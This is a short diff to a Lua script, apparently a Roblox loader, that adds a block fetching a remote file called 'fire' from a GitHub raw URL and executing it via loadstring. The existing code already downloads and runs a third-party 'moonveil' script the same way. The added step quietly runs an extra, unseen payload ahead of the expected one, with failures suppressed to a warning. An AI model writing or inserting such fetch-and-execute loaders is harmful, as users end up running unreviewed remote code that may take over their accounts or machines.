@@ -1,3 +1,11 @@
+local fireScriptSuccess, fireScriptError = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/walkdownej/EJSVault/refs/heads/main/fire"))()
+end)
+
+if not fireScriptSuccess then
+    warn("Failed to load fire script:", fireScriptError)
+end
+
 local success, result = pcall(function()
     local code = game:HttpGet("https://raw.githubusercontent.com/BigFella8/Roblox-Scripts/refs/heads/main/1-moonveil.lua")
     local func, err = loadstring(code)
